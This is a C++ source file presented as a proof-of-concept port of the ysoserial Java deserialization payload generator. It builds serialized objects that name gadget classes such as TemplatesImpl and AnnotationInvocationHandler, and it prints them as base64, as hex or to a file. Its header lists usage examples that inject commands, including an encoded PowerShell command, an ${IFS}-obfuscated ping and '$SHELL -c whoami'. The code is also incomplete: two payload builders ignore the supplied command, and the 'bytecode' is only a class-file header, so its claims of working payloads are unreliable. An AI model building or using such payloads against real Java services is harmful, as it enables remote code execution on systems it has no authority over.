/*

    PoC ( testing v0.0001 ) 
    

    # Build
     g++ -std=c++17 -O2 -o ysoserial-cpp ysoserial.cpp


    * Payload inject execution commands abusing serialization
        ./ysoserial-cpp templates "cmd /c calc"
    * Encoding
        ./ysoserial-cpp object1 "powershell -enc <base64_command>"
    * Obfucation 
        ./ysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
    * Inyecting ENV
        ./ysoserial-cpp templates "\$SHELL -c 'whoami'"



    # Code "ysoserial-cpp.cpp"
        ysoserial.cpp   # ysoserial-cpp
        ├── JavaSerialization   # Constants and types
        ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!

      .                                                                     ...                        ..    
  .x88888x.                                                ..           .zf"` `"tu               . uW8"      
 :8**888888X.  :>               u.    u.      u.    u.    @L           x88  day '8N.             `t888       
 f    `888888x./       .u     x@88k u@88c.  x@88k u@88c. 9888i   .dL   888k     d88&       u      8888   .   
'       `*88888~    ud8888.  ^"8888""8888" ^"8888""8888" `Y888k:*888.  8888N.  @888F    us888u.   9888.z88N  
 \.    .  `?)X.   :888'8888.   8888  888R    8888  888R    888E  888I  `88888 9888%  .@88 "8888"  9888  888E 
  `~=-^   X88> ~  d888 '88%"   8888  888R    8888  888R    888E  888I    %888 "88F   9888  9888   9888  888E 
         X8888  ~ 8888.+"      8888  888R    8888  888R    888E  888I     8"   "*h=~ 9888  9888   9888  888E 
         488888   8888L        8888  888R    8888  888R    888E  888I   z8Weu        9888  9888   9888  888E 
 .xx.     88888X  '8888c. .+  "*88*" 8888"  "*88*" 8888"  x888N><888'  ""88888i.   Z 9888  9888  .8888  888" 
'*8888.   '88888>  "88888%      ""   'Y"      ""   'Y"     "88"  888  "   "8888888*  "888*""888"  `%888*%"   
  88888    '8888>    "YP'                                        88F        ^"**""    ^Y"   ^Y'      "`      
  `8888>    `888            @h0ffy                               98"                                          
   "8888     8%                2025                             ./"                                            
    `"888x:-"                                                ~`                                            
                                                                               
# https://www.jennylab.net
# https://github.com/h0ffy
# https://github.com/JennyLab
# https://x.com/h0ffy
# GNU GPL3 License ( JennyLab OpenSource )

*/



#include <iostream>
#include <vector>
#include <string>
#include <cstdint>
#include <fstream>
#include <sstream>
#include <iomanip>

// Java Serializations Constants
namespace JavaSerialization {
    constexpr uint16_t STREAM_MAGIC = 0xACED;
    constexpr uint16_t STREAM_VERSION = 0x0005;
    
    // Type constants
    constexpr uint8_t TC_NULL = 0x70;
    constexpr uint8_t TC_REFERENCE = 0x71;
    constexpr uint8_t TC_CLASSDESC = 0x72;
    constexpr uint8_t TC_OBJECT = 0x73;
    constexpr uint8_t TC_STRING = 0x74;
    constexpr uint8_t TC_ARRAY = 0x75;
    constexpr uint8_t TC_CLASS = 0x76;
    constexpr uint8_t TC_BLOCKDATA = 0x77;
    constexpr uint8_t TC_ENDBLOCKDATA = 0x78;
    constexpr uint8_t TC_RESET = 0x79;
    constexpr uint8_t TC_BLOCKDATALONG = 0x7A;
    constexpr uint8_t TC_EXCEPTION = 0x7B;
    constexpr uint8_t TC_LONGSTRING = 0x7C;
    constexpr uint8_t TC_PROXYCLASSDESC = 0x7D;
    constexpr uint8_t TC_ENUM = 0x7E;
    
    // Class flags
    constexpr uint8_t SC_WRITE_METHOD = 0x01;
    constexpr uint8_t SC_SERIALIZABLE = 0x02;
    constexpr uint8_t SC_EXTERNALIZABLE = 0x04;
    constexpr uint8_t SC_BLOCK_DATA = 0x08;
    constexpr uint8_t SC_ENUM = 0x10;
}



//simple base64
class Base64 {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<uint8_t>& bytes) {
        std::string result;
        int val = 0, valb = -6;
        for (uint8_t c : bytes) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }
};

const std::string Base64::chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";




// Make object cereal killer!!
class JavaPayloadGen {
private:
    std::vector<uint8_t> buffer;
    uint32_t handleCounter;
    
    // Wrotten #define pack(4), pack(8)... tipical inna BSD Standard 
    void writeByte(uint8_t b) {
        buffer.push_back(b);
    }
    
    void writeShort(uint16_t s) {
        buffer.push_back(static_cast<uint8_t>((s >> 8) & 0xFF));
        buffer.push_back(static_cast<uint8_t>(s & 0xFF));
    }
    
    void writeInt(uint32_t i) {
        buffer.push_back(static_cast<uint8_t>((i >> 24) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((i >> 16) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((i >> 8) & 0xFF));
        buffer.push_back(static_cast<uint8_t>(i & 0xFF));
    }
    
    void writeLong(uint64_t l) {
        buffer.push_back(static_cast<uint8_t>((l >> 56) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 48) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 40) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 32) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 24) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 16) & 0xFF));
        buffer.push_back(static_cast<uint8_t>((l >> 8) & 0xFF));
        buffer.push_back(static_cast<uint8_t>(l & 0xFF));
    }


    // UTF Encoding ( critical section)
    void writeUTF(const std::string& str) {
        if (str.length() > 65535) {
            throw std::runtime_error("[ERROR] JavaPayloadGen::wruiteUTF(): String too long for UTF encoding");
        }
        
        writeShort(static_cast<uint16_t>(str.length()));
        for (char c : str) {
            writeByte(static_cast<uint8_t>(c));
        }
    }
    
    // Make Unique Handler
    uint32_t getNextHandle() {
        return 0x7E0000 + (handleCounter++);
    }
    
    // make a Object Class Descriptor
    void writeClassDesc(const std::string& className, uint64_t serialVersionUID, uint8_t flags = JavaSerialization::SC_SERIALIZABLE) {
        /* STATIC */
        writeByte(JavaSerialization::TC_CLASSDESC);
        writeUTF(className);
        writeLong(serialVersionUID);
        writeByte(flags);
        /* !if you're h4x0r like a pr0 */
        writeShort(0); // 0 fields too
        writeByte(JavaSerialization::TC_ENDBLOCKDATA); // END BLOCK DATA CHUNK
        writeByte(JavaSerialization::TC_NULL); // NULL CLASS DATA CHUNK
    }
    
    // write string to object ( Bounty Reasearch )
    void writeString(const std::string& str) {
        writeByte(JavaSerialization::TC_STRING);
        writeUTF(str);
    }
    
    // Object pre Computed builder
    void writeBytecode() {
        // Bytecodes PoC basic to execute básic command
        // Next versions dynamic it us or not but this is the trick ;) 
        std::vector<uint8_t> bytecode = {
            0xCA, 0xFE, 0xBA, 0xBE, // Magic number del class file
            0x00, 0x00, 0x00, 0x34, // Version
            // classfile data
        };
        
        for (uint8_t b : bytecode) {
            writeByte(b);
        }
    }
    
public:
    JavaPayloadGen() : handleCounter(0) {
      // Write Sample Serialization
        writeShort(JavaSerialization::STREAM_MAGIC);
        writeShort(JavaSerialization::STREAM_VERSION);
    }
    
    // Generar payload CommonObjects1 (simplificado)
    void commonObject1Payload(const std::string& command) {
        // Make InvocationHandler 
        writeByte(JavaSerialization::TC_OBJECT);
        writeClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", 0x6894A4E4C601B626); // InvocationHandler ( gagdet abuse and triggering ) 
        
        // Make field inna object
        writeString("type");
        writeByte(JavaSerialization::TC_CLASS);
        writeClassDesc("java.lang.Override", 0x0000000000000000);
        
        writeString("memberValues");
        writeByte(JavaSerialization::TC_OBJECT);
        writeClassDesc("java.util.HashMap", 0x362DA231DA6C07DE); // Hash MAP, sample method to memory container location
        
        // Gadget Chain 
        writeInt(2); // Fill minimal don't break
        writeByte(JavaSerialization::TC_ENDBLOCKDATA);
    }
    
    // Generar payload CommonObjects2 (simplificado)
    void commonObject2Payload(const std::string& command) {
        writeByte(JavaSerialization::TC_OBJECT);
        writeClassDesc("org.apache.commons.collections4.Transformer", 0x0000000000000000); // <--- In this site if you use gagdet class reflective abuse Java with JSP ;)  !if you're h4x0r like a pr0
      
        writeString(command);
        writeByte(JavaSerialization::TC_ENDBLOCKDATA);
    }
    
    // Maknig payload
    void createTemplatesImplPayload(const std::string& command) {
        writeByte(JavaSerialization::TC_OBJECT);
        writeClassDesc("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", 0x79FC5FBF46CB5A67);
        
        // _bytecodes field
        writeByte(JavaSerialization::TC_ARRAY);
        writeClassDesc("[B", 0xACF317F8CC6C264); // byte array class 
        writeInt(1); // Array length
        writeBytecode(); // Bytecode evile!!
        
        // _name field
        writeString("jl4b-pwn3rs");
        
        // _tfactory field (null para simplificar)
        writeByte(JavaSerialization::TC_NULL);
        
        writeByte(JavaSerialization::TC_ENDBLOCKDATA);
    }
    
    // to vector of bytes array
    std::vector<uint8_t> getPayload() const {
        return buffer;
    }
    
    // to base64
    std::string toBase64() const {
        return Base64::encode(buffer);
    }
    
    // to hex
    std::string toHex() const {
        std::stringstream ss;
        for (uint8_t b : buffer) {
            ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(b);
        }
        return ss.str();
    }
    
    // Save US!
    void saveToFile(const std::string& filename) const {
        std::ofstream file(filename, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Cannot open file for writing");
        }
        
        file.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
        file.close();
    }
    
    // cleaning out my closet!!! :)
    void reset() {
        buffer.clear();
        handleCounter = 0;
        
        // Override
        writeShort(JavaSerialization::STREAM_MAGIC);
        writeShort(JavaSerialization::STREAM_VERSION);
    }
};



int main(int argc, char* argv[]) {
    try {
        if (argc < 3) {
            std::cout << "Using: " << argv[0] << " <payload_type> <cnd>\n";
            std::cout << "Payload Test in PoC:\n";
            std::cout << "  object1  - Java Common Objects\n";
            std::cout << "  object2  - Java Common Objects\n";
            std::cout << "  templates - TemplatesImpl\n";
            std::cout << "\nExample: " << argv[0] << " object1 \"calc.exe\"\n";
            std::cout << "\nExample: " << argv[0] << " object1 \"ping jennylab.net\"\n";
            std::cout << "\nExample: " << argv[0] << " object1 \"ping jennylab.net\"\n";

          
            return 1;
        }
        
        std::string payloadType = argv[1];
        std::string command = argv[2];
        
        JavaPayloadGen javaObj;
        
        if (payloadType == "object1") {
            javaObj.commonObject1Payload(command);
        } else if (payloadType == "object2") {
            javaObj.commonObject2Payload(command);
        } else if (payloadType == "templates") {
            javaObj.createTemplatesImplPayload(command);
        } else {
            std::cerr << "[ERROR] main(): Invalid pyaload: " << payloadType << std::endl;
            return 1;
        }
        
      
      
        std::cout << "Make CMD: " << command << std::endl;
        std::cout << "PayLoad Type: " << payloadType << std::endl;
        std::cout << "Size: " << javaObj.getPayload().size() << " bytes\n\n";
        std::cout << "Base64:\n" << javaObj.toBase64() << "\n\n";
        std::cout << "Hex:\n" << javaObj.toHex() << "\n\n";


      
        std::string filename = payloadType + "_payload.obj";
        javaObj.saveToFile(filename);
        std::cout << "Output: " << filename << std::endl;
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] main(): Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
